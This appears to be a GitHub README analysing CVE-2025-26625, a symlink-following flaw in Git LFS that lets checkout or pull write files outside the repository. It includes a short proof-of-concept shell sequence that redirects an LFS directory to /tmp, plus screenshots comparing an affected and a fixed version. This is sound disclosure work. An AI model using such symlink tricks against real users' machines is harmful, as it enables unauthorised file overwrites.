# CVE-2025-26625: Git LFS Vulnerability Analysis and Mitigation
<img width="401" height="737" alt="image" src="https://github.com/user-attachments/assets/078b3370-fe30-4ac2-849b-956354fe12f0" />

## Overview

**CVE-2025-26625** is a vulnerability affecting **Git LFS (Git Large File Storage)** versions **0.5.2 through 3.7.0**, where the commands  
`git lfs checkout` and `git lfs pull` fail to properly validate symbolic links before writing to files in the working tree.

An attacker would need to do some serious social engineering to pull off this attack as the victim will have to create the symbolic link themselves.
The attacker vector for this is quite low/difficult because of this.

Discovered and disclosed on **October 17, 2025**, this issue impacts all Git LFS installations released since version 0.5.2.  
It was documented in both the **GitHub Security Advisory** and the **National Vulnerability Database (NVD)**.

---

## Technical Details

The vulnerability arises from **improper link resolution before file access**, classified under **[CWE-59: Improper Link Resolution Before File Access ('Link Following')](https://cwe.mitre.org/data/definitions/59.html)**.

When Git LFS populates a repository’s working tree with large file objects, certain commands may inadvertently **follow existing symbolic or hard links**.  
If those links point **outside the repository’s working tree**, the LFS process may write data to unintended locations on the filesystem — potentially allowing a malicious repository to modify arbitrary files accessible to the user.

**Affected Commands:**
- `git lfs checkout`
- `git lfs pull`
---

```
# Machine A
mkdir lfs-remote-demo && cd lfs-remote-demo
git init
git lfs install
git lfs track "*.bin"
mkdir data
printf "you got pwned\n" > data/file.bin
git add .gitattributes data/file.bin
git commit -m "Add LFS file"
git push


# Machine B
git clone <the-remote-url> lfs-attack-demo
cd lfs-attack-demo

# At this point git has created "data" (a directory) and a pointer file or placeholder.
# Now remove the directory and replace it with a symlink to /tmp (or another safe path)
# yeah... the victim will need to create the symblink and pwn themselves...
rm -rf data
ln -s /tmp data

# Now run git lfs pull
git lfs pull

```

Example using `git lts` version 3.6.0: file written to the `SHOULD_BE_EMPTY` directory

<img width="851" height="852" alt="image" src="https://github.com/user-attachments/assets/4893d041-33f4-4f6c-a9ca-18038fecd0e6" />


Upgraded `git lts` version 3.7.1: Nothing written to the `SHOULD_BE_EMPTY` directory

<img width="851" height="789" alt="image" src="https://github.com/user-attachments/assets/41fd309a-1610-44f5-97dd-fe7e8ec5e229" />
